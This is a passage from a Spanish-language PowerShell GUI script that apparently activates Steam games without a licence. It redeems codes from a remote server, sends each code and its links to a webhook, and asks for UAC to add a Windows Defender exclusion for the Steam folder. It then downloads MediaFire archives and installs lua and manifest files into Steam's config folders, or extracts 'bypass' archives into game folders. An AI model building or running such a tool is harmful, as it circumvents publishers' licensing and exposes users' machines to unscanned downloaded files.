        $btnCanjear.Enabled = $false
        $txtCode.Enabled = $false
        $pb.Value = 0; $pb.Visible = $true
        $lblStatus.Text = "Canjeando..."; $lblStatus.ForeColor = [System.Drawing.Color]::FromArgb(255, 210, 0); $lblStatus.Visible = $true
        [System.Windows.Forms.Application]::DoEvents()
        try {
            $code = $txtCode.Text.Trim()
            if ([string]::IsNullOrEmpty($code)) { throw "Pega un codigo primero." }

            Set-Status "Canjeando..."
            $body = @{code=$code;client_id=$script:clientId} | ConvertTo-Json
            try {
                $resp = Invoke-RestMethod -Uri "$($script:serverUrl)/api/redeem-code" -Method Post -Body $body -ContentType "application/json" -TimeoutSec 10 -ErrorAction Stop
            } catch {
                $lblStatus.Text = "Actualizando URL..."; [System.Windows.Forms.Application]::DoEvents()
                Update-ServerUrl
                if ($script:serverUrl -ne "http://localhost:8768") {
                    try {
                        $resp = Invoke-RestMethod -Uri "$($script:serverUrl)/api/redeem-code" -Method Post -Body $body -ContentType "application/json" -TimeoutSec 10 -ErrorAction Stop
                    } catch {
                        if ($_.Exception.Response.StatusCode -eq 404) { throw "Servidor no disponible en $($script:serverUrl). Asegurate de que el servidor este corriendo." }
                        throw "Error de conexion: $($_.Exception.Message)"
                    }
                } else {
                    if ($_.Exception.Response.StatusCode -eq 404) { throw "Servidor no disponible en $($script:serverUrl). Asegurate de que el servidor este corriendo." }
                    throw "Error de conexion: $($_.Exception.Message)"
                }
            }
            if (-not $resp.ok) { throw $resp.err }
            $links = @($resp.links)
            $duration = [int]$resp.duration
            if ($links.Count -eq 0) { throw "El codigo no contiene links." }
            Send-Webhook $code ($links -join "`n")
            $expDate = if ($duration -gt 0) { (Get-Date).AddSeconds($duration) } else { $null }
            $successCount = 0; $errorCount = 0
            $total = $links.Count

            # Defender exclusion (asks for UAC if needed)
            Set-Status "Excluyendo Steam del antivirus..." $Yellow
            $lblStatus.Text = "Excluyendo del antivirus..."; [System.Windows.Forms.Application]::DoEvents()
            try {
                $steamRoot = Get-SteamPath
                if (-not (Add-DefenderExclusion $steamRoot)) {
                    $resp2 = [System.Windows.Forms.MessageBox]::Show("Debes aceptar UAC para excluir Steam del antivirus.`nContinuar de todas formas?", "Antivirus", "YesNo", "Warning")
                    if ($resp2 -eq "No") { throw "Operacion cancelada por el usuario." }
                }
            } catch { throw "No se encontro Steam: $($_.Exception.Message)" }

            foreach ($mfUrl in $links) {
                $gameName = [System.IO.Path]::GetFileNameWithoutExtension(($mfUrl -split '/')[-2])
                if ($gameName) { $gameName = $gameName -replace '%[0-9a-fA-F]{2}', '' }
                $lblStatus.Text = "($($successCount+1)/$total) $gameName"
                Set-Status "($($successCount+1)/$total) $gameName" $Yellow
                [System.Windows.Forms.Application]::DoEvents()
                $zipFile = Join-Path $env:TEMP "fix_$(Get-Random).zip"
                try {
                    Download-MediaFire $mfUrl $zipFile $pb 0 80
                    $lblStatus.Text = "Activando $gameName..."
                    Set-Status "Activando $gameName..." $Yellow
                    [System.Windows.Forms.Application]::DoEvents()
                    $pb.Value = 85
                    $installResult = Extract-AndInstall $zipFile $gameName $expDate
                    if ($duration -gt 0 -and $expDate) {
                        $timers = Get-ActiveTimers
                        $internetNow = Get-InternetTime
                        $steamRoot = Get-SteamPath
                        $timers += @{ expires_at = $expDate.ToString("o"); internet_created_at = $(if ($internetNow) { $internetNow.ToString("o") } else { $null }); game_name = $gameName; steam_root = $steamRoot; lua_files = @($installResult.lua); manifest_files = @($installResult.manifest) }
                        Save-Timers $timers
                    }
                    $successCount++
                } catch {
                    $errorCount++
                }
                Remove-Item -Path $zipFile -Force -ErrorAction SilentlyContinue
            }
            $pb.Value = 100
            if ($successCount -gt 0) {
                Set-Status "$successCount/$total juegos activados" $Green
                $lblStatus.ForeColor = [System.Drawing.Color]::FromArgb(60, 220, 100)
                $lblStatus.Text = "$successCount de $total juegos activados correctamente"
                if ($duration -gt 0 -and $expDate) {
                    Start-Countdown $duration $expDate $gameName
                }
                Update-TimersList
                [System.Windows.Forms.MessageBox]::Show("$successCount de $total juegos activados correctamente.", "Listo", "OK", "Information")
                $dlg.Close()
            } else {
                throw "No se pudo aplicar ningun fix."
            }
        } catch {
            $pb.Value = 0
            $lblStatus.ForeColor = [System.Drawing.Color]::FromArgb(255, 60, 60)
            $lblStatus.Text = "Error: $($_.Exception.Message)"
            Set-Status "Error: $($_.Exception.Message)" $script:Red
            [System.Windows.Forms.MessageBox]::Show("Error: $($_.Exception.Message)", "Error", "OK", "Error")
        } finally {
            $btnCanjear.Enabled = $true
            $txtCode.Enabled = $true
        }
    })
    $dlg.Controls.Add($btnCanjear)

    $btnCerrar = New-Object System.Windows.Forms.Button
    $btnCerrar.Text = "Cerrar"
    $btnCerrar.Size = New-Object System.Drawing.Size(100, 38)
    $btnCerrar.Location = New-Object System.Drawing.Point(300, 155)
    $btnCerrar.BackColor = [System.Drawing.Color]::FromArgb(22, 33, 62)
    $btnCerrar.ForeColor = [System.Drawing.Color]::FromArgb(130, 142, 162)
    $btnCerrar.FlatStyle = "Flat"
    $btnCerrar.Add_Click({ $dlg.Close() })
    $dlg.Controls.Add($btnCerrar)

    $txtCode.Focus()
    $dlg.ShowDialog()
}

function Show-MenuDialog {
    $dlg = New-Object System.Windows.Forms.Form
    $dlg.Text = "Opciones"
    $dlg.Size = New-Object System.Drawing.Size(380, 220)
    $dlg.StartPosition = "CenterParent"
    $dlg.BackColor = [System.Drawing.Color]::FromArgb(11, 15, 25)
    $dlg.ForeColor = [System.Drawing.Color]::White
    $dlg.FormBorderStyle = "FixedDialog"
    $dlg.ShowInTaskbar = $false
    $dlg.MaximizeBox = $false; $dlg.MinimizeBox = $false

    $lbl = New-Object System.Windows.Forms.Label
    $lbl.Text = "Elige que ejecutar:"
    $lbl.ForeColor = [System.Drawing.Color]::FromArgb(0, 180, 230)
    $lbl.Size = New-Object System.Drawing.Size(340, 20)
    $lbl.Location = New-Object System.Drawing.Point(20, 15)
    $lbl.TextAlign = "MiddleCenter"
    $dlg.Controls.Add($lbl)

    $lblPc = New-Object System.Windows.Forms.Label
    $lblPc.Text = "PC ID: $script:clientId"
    $lblPc.ForeColor = [System.Drawing.Color]::FromArgb(0, 180, 230)
    $lblPc.Size = New-Object System.Drawing.Size(340, 14)
    $lblPc.Location = New-Object System.Drawing.Point(20, 32)
    $lblPc.TextAlign = "MiddleCenter"
    $lblPc.Font = Get-SafeFont "Consolas" 7
    $dlg.Controls.Add($lblPc)

    $btnRepair = New-Object System.Windows.Forms.Button
    $btnRepair.Text = "Reparar Juegos"
    $btnRepair.Size = New-Object System.Drawing.Size(160, 45)
    $btnRepair.Location = New-Object System.Drawing.Point(110, 55)
    $btnRepair.BackColor = [System.Drawing.Color]::FromArgb(25, 100, 200)
    $btnRepair.ForeColor = [System.Drawing.Color]::White
    $btnRepair.FlatStyle = "Flat"
    $btnRepair.Font = Get-SafeFont "Segoe UI" 10 ([System.Drawing.FontStyle]::Bold)
    $btnRepair.Add_Click({
        $dlg.Close()
        Start-RepairFlow
    })
    $dlg.Controls.Add($btnRepair)

    $btnUpdateCheck = New-Object System.Windows.Forms.Button
    $btnUpdateCheck.Text = "Verificar Version"
    $btnUpdateCheck.Size = New-Object System.Drawing.Size(160, 45)
    $btnUpdateCheck.Location = New-Object System.Drawing.Point(110, 108)
    $btnUpdateCheck.BackColor = [System.Drawing.Color]::FromArgb(22, 33, 62)
    $btnUpdateCheck.ForeColor = [System.Drawing.Color]::White
    $btnUpdateCheck.FlatStyle = "Flat"
    $btnUpdateCheck.Add_Click({
        $dlg.Close()
        try {
            $r = Invoke-RestMethod "https://api.github.com/repos/bastisayes/Fixes-steam/contents/original_blue.ps1" -UseBasicParsing -TimeoutSec 8 -ErrorAction SilentlyContinue
            if ($r.content) {
                $b64 = $r.content -replace "`n|`r", ""
                $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b64))
                if ($decoded -match '\$script:version\s*=\s*"([^"]+)"') {
                    $remoteVer = $matches[1]
                    if ($remoteVer -gt $script:version) {
                        [System.Windows.Forms.MessageBox]::Show("Nueva version disponible: $remoteVer`nTu version: $($script:version)", "Actualizar", "OK", "Information")
                    } else {
                        [System.Windows.Forms.MessageBox]::Show("Tienes la ultima version ($($script:version)).", "Actualizar", "OK", "Information")
                    }
                } else {
                    [System.Windows.Forms.MessageBox]::Show("No se pudo verificar la version.", "Actualizar", "OK", "Information")
                }
            }
        } catch {
            [System.Windows.Forms.MessageBox]::Show("Error al verificar: $($_.Exception.Message)", "Error", "OK", "Error")
        }
    })
    $dlg.Controls.Add($btnUpdateCheck)

    $btnCancel = New-Object System.Windows.Forms.Button
    $btnCancel.Text = "Cerrar"
    $btnCancel.Size = New-Object System.Drawing.Size(100, 30)
    $btnCancel.Location = New-Object System.Drawing.Point(140, 165)
    $btnCancel.BackColor = [System.Drawing.Color]::FromArgb(22, 33, 62)
    $btnCancel.ForeColor = [System.Drawing.Color]::FromArgb(130, 142, 162)
    $btnCancel.FlatStyle = "Flat"
    $btnCancel.Add_Click({ $dlg.Close() })
    $dlg.Controls.Add($btnCancel)

    $dlg.ShowDialog()
}

function Show-UninstallDialog {
    $timers = Get-ActiveTimers
    if ($timers.Count -eq 0) {
        [System.Windows.Forms.MessageBox]::Show("No hay codigos activos para desinstalar.", "Desinstalar", "OK", "Information")
        return
    }
    $resp = [System.Windows.Forms.MessageBox]::Show("Se eliminaran TODOS los fixes activos.`nContinuar?", "Desinstalar Todo", "YesNo", "Warning")
    if ($resp -ne "Yes") { return }
    $errors = 0
    foreach ($t in $timers) {
        try {
            $root = $t.steam_root
            foreach ($f in $t.lua_files) {
                Remove-FileHard (Join-Path (Join-Path $root "config\stplug-in") $f)
                Remove-FileHard (Join-Path (Join-Path $root "config\lua") $f)
            }
            foreach ($f in $t.manifest_files) {
                Remove-FileHard (Join-Path (Join-Path $root "config\depotcache") $f)
            }
        } catch { $errors++ }
    }
    Save-Timers @()
    Update-TimersList
    Set-Status "Todos los fixes eliminados" $Green
    [System.Windows.Forms.MessageBox]::Show("Fixes eliminados correctamente.", "Listo", "OK", "Information")
}

function Start-RepairFlow {
    try {
        Set-Status "Cargando fixes..." $Yellow
        [System.Windows.Forms.Application]::DoEvents()
        $fixes = Get-FixesList
        if ($fixes.Count -eq 0) { throw "No se encontraron fixes en la carpeta." }
        $games = Get-InstalledGames
        $picker = New-Object System.Windows.Forms.Form
        $picker.Text = "Reparar Juego"
        $picker.Size = New-Object System.Drawing.Size(420, 320)
        $picker.StartPosition = "CenterParent"
        $picker.BackColor = [System.Drawing.Color]::FromArgb(11, 15, 25)
        $picker.ForeColor = [System.Drawing.Color]::White
        $picker.FormBorderStyle = "FixedDialog"
        $picker.ShowInTaskbar = $false
        $picker.MaximizeBox = $false; $picker.MinimizeBox = $false

        $listBox = New-Object System.Windows.Forms.ListBox
        $listBox.Size = New-Object System.Drawing.Size(370, 200)
        $listBox.Location = New-Object System.Drawing.Point(25, 20)
        $listBox.BackColor = [System.Drawing.Color]::FromArgb(22, 33, 62)
        $listBox.ForeColor = [System.Drawing.Color]::FromArgb(0, 180, 230)
        $listBox.Font = Get-SafeFont "Consolas" 9
        $listBox.BorderStyle = "FixedSingle"
        $fixes.Keys | Sort-Object | ForEach-Object { [void]$listBox.Items.Add($_) }
        $picker.Controls.Add($listBox)

        $lblInfo2 = New-Object System.Windows.Forms.Label
        $lblInfo2.Text = "Selecciona un fix y se buscara el juego automaticamente"
        $lblInfo2.ForeColor = [System.Drawing.Color]::FromArgb(130, 142, 162)
        $lblInfo2.Size = New-Object System.Drawing.Size(370, 20)
        $lblInfo2.Location = New-Object System.Drawing.Point(25, 225)
        $lblInfo2.TextAlign = "MiddleCenter"
        $picker.Controls.Add($lblInfo2)

        $btnOk = New-Object System.Windows.Forms.Button
        $btnOk.Text = "Reparar"
        $btnOk.Size = New-Object System.Drawing.Size(140, 35)
        $btnOk.Location = New-Object System.Drawing.Point(60, 250)
        $btnOk.BackColor = [System.Drawing.Color]::FromArgb(25, 100, 200)
        $btnOk.ForeColor = [System.Drawing.Color]::White
        $btnOk.FlatStyle = "Flat"
        $btnOk.Font = Get-SafeFont "Segoe UI" 10 ([System.Drawing.FontStyle]::Bold)
        $btnOk.Add_Click({
            if ($listBox.SelectedItem -eq $null) { return }
            $picker.Close()
            $fixName = $listBox.SelectedItem
            $fixUrl = $fixes[$fixName]
            $gamePath, $gameFound = Find-GameFolder $fixName $games
            if (-not $gamePath) {
                $fbd = New-Object System.Windows.Forms.FolderBrowserDialog
                $fbd.Description = "No se detecto automaticamente. Elegi la carpeta del juego"
                $fbd.ShowNewFolderButton = $false
                if ($fbd.ShowDialog() -ne "OK") { return }
                $gamePath = $fbd.SelectedPath
            }
            Run-Repair $gamePath $fixName $fixUrl
        })
        $picker.Controls.Add($btnOk)

        $btnCancel2 = New-Object System.Windows.Forms.Button
        $btnCancel2.Text = "Cancelar"
        $btnCancel2.Size = New-Object System.Drawing.Size(100, 35)
        $btnCancel2.Location = New-Object System.Drawing.Point(230, 250)
        $btnCancel2.BackColor = [System.Drawing.Color]::FromArgb(22, 33, 62)
        $btnCancel2.ForeColor = [System.Drawing.Color]::FromArgb(130, 142, 162)
        $btnCancel2.FlatStyle = "Flat"
        $btnCancel2.Add_Click({ $picker.Close() })
        $picker.Controls.Add($btnCancel2)

        $picker.ShowDialog()
    } catch {
        Set-Status "Error: $($_.Exception.Message)" $script:Red
        [System.Windows.Forms.MessageBox]::Show("Error: $($_.Exception.Message)", "Error", "OK", "Error")
    }
}

function Run-Repair {
    param([string]$gamePath, [string]$fixName, [string]$fixUrl)
    $dlg = New-Object System.Windows.Forms.Form
    $dlg.Text = "Reparar - $fixName"
    $dlg.Size = New-Object System.Drawing.Size(480, 200)
    $dlg.StartPosition = "CenterParent"
    $dlg.BackColor = [System.Drawing.Color]::FromArgb(11, 15, 25)
    $dlg.ForeColor = [System.Drawing.Color]::White
    $dlg.FormBorderStyle = "FixedDialog"
    $dlg.ShowInTaskbar = $false
    $dlg.ControlBox = $false

    $lblInfo = New-Object System.Windows.Forms.Label
    $lblInfo.Text = "Juego: $fixName`nCarpeta: $gamePath`n`nAplicar fix aqui?"
    $lblInfo.ForeColor = [System.Drawing.Color]::FromArgb(130, 142, 162)
    $lblInfo.Size = New-Object System.Drawing.Size(440, 60)
    $lblInfo.Location = New-Object System.Drawing.Point(20, 15)
    $lblInfo.TextAlign = "MiddleCenter"
    $dlg.Controls.Add($lblInfo)

    $pb = New-Object System.Windows.Forms.ProgressBar
    $pb.Size = New-Object System.Drawing.Size(420, 22)
    $pb.Location = New-Object System.Drawing.Point(30, 88)
    $pb.Style = "Continuous"
    $pb.ForeColor = [System.Drawing.Color]::FromArgb(0, 180, 230)
    $pb.BackColor = [System.Drawing.Color]::FromArgb(22, 33, 62)
    $pb.Value = 0
    $pb.Visible = $false
    $dlg.Controls.Add($pb)

    $lblResult = New-Object System.Windows.Forms.Label
    $lblResult.Text = ""
    $lblResult.ForeColor = [System.Drawing.Color]::FromArgb(60, 220, 100)
    $lblResult.Font = Get-SafeFont "Segoe UI" 12 ([System.Drawing.FontStyle]::Bold)
    $lblResult.Size = New-Object System.Drawing.Size(440, 30)
    $lblResult.Location = New-Object System.Drawing.Point(20, 88)
    $lblResult.TextAlign = "MiddleCenter"
    $lblResult.Visible = $false
    $dlg.Controls.Add($lblResult)

    $btnSi = New-Object System.Windows.Forms.Button
    $btnSi.Text = "Si"
    $btnSi.Size = New-Object System.Drawing.Size(120, 35)
    $btnSi.Location = New-Object System.Drawing.Point(115, 130)
    $btnSi.BackColor = [System.Drawing.Color]::FromArgb(25, 100, 200)
    $btnSi.ForeColor = [System.Drawing.Color]::White
    $btnSi.FlatStyle = "Flat"
    $btnSi.Font = Get-SafeFont "Segoe UI" 10 ([System.Drawing.FontStyle]::Bold)

    $btnNo = New-Object System.Windows.Forms.Button
    $btnNo.Text = "No"
    $btnNo.Size = New-Object System.Drawing.Size(120, 35)
    $btnNo.Location = New-Object System.Drawing.Point(245, 130)
    $btnNo.BackColor = [System.Drawing.Color]::FromArgb(22, 33, 62)
    $btnNo.ForeColor = [System.Drawing.Color]::FromArgb(130, 142, 162)
    $btnNo.FlatStyle = "Flat"
    $btnNo.Add_Click({ $dlg.Close() })

    $btnSi.Add_Click({
        $btnSi.Enabled = $false; $btnNo.Enabled = $false
        $lblInfo.Visible = $false; $pb.Visible = $true
        $lblResult.ForeColor = [System.Drawing.Color]::FromArgb(130, 142, 162)
        $lblResult.Text = "Conectando..."; $lblResult.Visible = $true
        [System.Windows.Forms.Application]::DoEvents()
        try {
            $zip = Join-Path $env:TEMP "fix_$(Get-Random).zip"
            $lblResult.Text = "Descargando reparacion..."; $lblResult.ForeColor = [System.Drawing.Color]::FromArgb(255, 210, 0)
            Set-Status "Reparando $fixName..." $Yellow
            Download-MediaFire $fixUrl $zip $pb 0 60
            $pb.Value = 60
            $lblResult.Text = "Extrayendo..."
            Expand-Archive -Path $zip -DestinationPath $gamePath -Force
            Remove-Item -LiteralPath $zip -Force -ErrorAction SilentlyContinue
            for ($p = 60; $p -le 100; $p++) { $pb.Value = $p; [System.Windows.Forms.Application]::DoEvents() }
            Start-Sleep -Milliseconds 300
            $pb.Visible = $false
            $lblResult.ForeColor = [System.Drawing.Color]::FromArgb(60, 220, 100)
            $lblResult.Text = "Reparacion completada!`nAbre el juego y verifica."
            $btnSi.Visible = $false
            $btnNo.Text = "Cerrar"; $btnNo.Location = New-Object System.Drawing.Point(180, 130); $btnNo.Enabled = $true
            Set-Status "Listo" $Green
        } catch {
            $pb.Visible = $false
            $lblResult.ForeColor = [System.Drawing.Color]::FromArgb(255, 60, 60)
            $lblResult.Text = "Error: $($_.Exception.Message)"
            $btnNo.Text = "Cerrar"; $btnNo.Location = New-Object System.Drawing.Point(180, 130); $btnNo.Enabled = $true
            Set-Status "Error: $($_.Exception.Message)" $script:Red
        }
    })
    $dlg.Controls.Add($btnSi); $dlg.Controls.Add($btnNo)
    $dlg.ShowDialog()
}

# ---- Helper functions for repair ----
function Get-FixesList {
    try {
        $r = Invoke-RestMethod -Uri "https://www.mediafire.com/api/1.5/folder/get_content.php?folder_key=3o9127pseyx49&response_format=json&content_type=files" -UseBasicParsing -TimeoutSec 10 -ErrorAction Stop
    } catch { return @{} }
    $fixes = @{}
    if ($r.response.folder_content.files) {
        foreach ($f in $r.response.folder_content.files) {
            $name = $f.filename -replace '\.zip$', ''
            $fixes[$name] = $f.links.normal_download
        }
    }
    return $fixes
}

function Get-InstalledGames {
    $games = @{}
    foreach ($lib in Get-SteamLibraries) {
        $common = Join-Path $lib "steamapps\common"
        if (Test-Path $common) {
            Get-ChildItem -LiteralPath $common -Directory -ErrorAction SilentlyContinue | ForEach-Object { $games[$_.Name] = $_.FullName }
        }
    }
    return $games
}

function Get-SteamLibraries {
    $steamRoot = Get-SteamPath
    $libs = @($steamRoot)
    $vdf = Join-Path $steamRoot "steamapps\libraryfolders.vdf"
    if (Test-Path $vdf) {
        $v = Get-Content $vdf -Raw -ErrorAction SilentlyContinue
        [regex]::Matches($v, '"path"\s+"([^"]+)"') | ForEach-Object { $p = $_.Groups[1].Value; if (Test-Path $p) { $libs += $p } }
    }
    return $libs | Select-Object -Unique
}

function Normalize-Name {
    param([string]$n)
    return ($n -replace '[^a-z0-9 ]', '').ToLower().Trim()
}

function Get-LevenshteinDistance {
    param([string]$a, [string]$b)
    $n = $a.Length; $m = $b.Length
    if ($n -eq 0) { return $m }; if ($m -eq 0) { return $n }
    $prev = New-Object int[] ($m + 1)
    $curr = New-Object int[] ($m + 1)
    for ($j = 0; $j -le $m; $j++) { $prev[$j] = $j }
    for ($i = 1; $i -le $n; $i++) {
        $curr[0] = $i
        for ($j = 1; $j -le $m; $j++) {
            $cost = if ($a[$i-1] -ceq $b[$j-1]) { 0 } else { 1 }
            $del = $prev[$j] + 1; $ins = $curr[$j-1] + 1; $sub = $prev[$j-1] + $cost
            $min = $del; if ($ins -lt $min) { $min = $ins }; if ($sub -lt $min) { $min = $sub }
            $curr[$j] = $min
        }
        $tmp = $prev; $prev = $curr; $curr = $tmp
    }
    return $prev[$m]
}

function Find-GameFolder {
    param([string]$fixName, [hashtable]$games)
    $clean = $fixName -replace '(?i)\s*(UB|Ubisoft)?\s*(Bypass|Fix|Patch|Fix)\s*$', ''
    $clean = $clean -replace '(?i)\s*\(\d+\)\s*$', ''
    $clean = $clean -replace '_', ' '
    $clean = $clean.Trim()
    $fn = Normalize-Name $clean
    $fnWords = @($fn -split '\s+' | Where-Object { $_.Length -gt 0 })
    $bestMatch = $null; $bestScore = 0
    foreach ($g in $games.Keys) {
        $gfn = Normalize-Name $g
        $maxLen = [Math]::Max($fn.Length, $gfn.Length)
        $minLen = [Math]::Min($fn.Length, $gfn.Length)
        if ($fn -eq $gfn) { return $games[$g], $g }
        if ($fn -like "*$gfn*" -or $gfn -like "*$fn*") {
            $shorter = if ($fn.Length -le $gfn.Length) { $fn } else { $gfn }
            $longer = if ($fn.Length -gt $gfn.Length) { $fn } else { $gfn }
            if ($minLen -ge $maxLen * 0.6) { $score = $maxLen; if ($score -gt $bestScore) { $bestScore = $score; $bestMatch = $g } }
            elseif ($shorter -notmatch '\s' -and $longer.EndsWith($shorter)) { $score = $maxLen; if ($score -gt $bestScore) { $bestScore = $score; $bestMatch = $g } }
        }
        $gWords = @($gfn -split '\s+' | Where-Object { $_.Length -gt 0 })
        $common = 0
        foreach ($w in $fnWords) {
            foreach ($gw in $gWords) {
                if ($w -eq $gw) { $common++; break }
                if ($w -like "*$gw*" -or $gw -like "*$w*") { $common += 0.5; break }
            }
        }
        $total = [Math]::Max($fnWords.Count, $gWords.Count)
        if ($total -gt 0) {
            $ratio = $common / $total
            if ($ratio -ge 0.4 -and $ratio -gt $bestScore) { $bestScore = $ratio; $bestMatch = $g }
        }
        if ($maxLen -gt 3) {
            $dist = Get-LevenshteinDistance $fn $gfn
            $threshold = [Math]::Max(1, [Math]::Floor($maxLen * 0.2))
            if ($dist -le $threshold) { $score = $maxLen - $dist; if ($score -gt $bestScore) { $bestScore = $score; $bestMatch = $g } }
        }
    }
    if ($bestMatch) { return $games[$bestMatch], $bestMatch }
    return $null, $null
}

# ---- Countdown ----
$script:countdownText = $null
$script:countdownTick = $null

function Start-Countdown {
    param([int]$durationSec, [datetime]$expDate, [string]$gameName)
    $script:countdownText = "Tiempo: $([math]::Floor($durationSec / 60))m $($durationSec % 60)s"
    $script:statusPanel.Invalidate()
    if ($script:countdownTick) { $script:countdownTick.Stop(); $script:countdownTick.Dispose() }
    $script:countdownTick = New-Object System.Windows.Forms.Timer
    $script:countdownTick.Interval = 1000
    $script:countdownTick.Tag = @{ endTime = $expDate; gameName = $gameName }
    $script:countdownTick.Add_Tick({
        $now = Get-Date; $end = $this.Tag.endTime; $g = $this.Tag.gameName
        $left = ($end - $now).TotalSeconds
        if ($left -le 0) {
            $this.Stop()
            $script:countdownText = $null
            Remove-ExpiredTimers | Out-Null
            Update-TimersList
            $script:statusPanel.Invalidate()
            [System.Windows.Forms.MessageBox]::Show("El tiempo para $g ha expirado.", "Tiempo Expirado", "OK", "Information")
        } else {
            $script:countdownText = "Tiempo: $([math]::Floor($left / 60))m $([math]::Round($left % 60))s"
            $script:statusPanel.Invalidate()
        }
    })
    $script:countdownTick.Start()
}

# ---- Timer List Update ----
function Update-TimersList {
    Remove-ExpiredTimers | Out-Null
    $timers = Get-ActiveTimers
    $lstTimers.BeginUpdate()
    $lstTimers.Items.Clear()
    if ($timers.Count -eq 0) {
        $lblActivos.Visible = $false; $lstTimers.Visible = $false; $btnExpirar.Visible = $false
        $lstTimers.EndUpdate(); return
    }
    $lblActivos.Visible = $true; $lstTimers.Visible = $true; $btnExpirar.Visible = $true
    $now = Get-Date
    try {
        foreach ($t in $timers) {
            $exp = $t.expires_at -as [datetime]; if (-not $exp) { continue }
            $left = ($exp - $now).TotalSeconds
            if ($left -le 0) {
                $lstTimers.Items.Add("[EXPIRADO] $($t.game_name)")
            } else {
                $h = [math]::Floor($left / 3600); $m = [math]::Floor(($left % 3600) / 60); $s = [math]::Round($left % 60)
                $lstTimers.Items.Add("$($t.game_name) - $h`h $m`m $s`s")
            }
        }
    } catch {}
    $lstTimers.EndUpdate()
}

# Refresh timers list every 5 seconds
$script:refreshTimers = New-Object System.Windows.Forms.Timer
$script:refreshTimers.Interval = 5000
$script:refreshTimers.Add_Tick({ Update-TimersList })
$script:refreshTimers.Start()

# URL checker every 60s
$script:urlChecker = New-Object System.Windows.Forms.Timer
$script:urlChecker.Interval = 60000
$script:urlChecker.Add_Tick({ Update-ServerUrl })
$script:urlChecker.Start()

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
#  RUN
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
Update-TimersList
[System.Windows.Forms.Application]::Run($form)

# Cleanup
$FntTitleBig.Dispose(); $FntActivator.Dispose(); $FntCardTitle.Dispose()
$FntCardSub.Dispose(); $FntStatusBold.Dispose(); $FntArrow.Dispose()
$FntSalir.Dispose(); $FntSmall.Dispose(); $FntTiny.Dispose()
$iconBmp.Dispose()
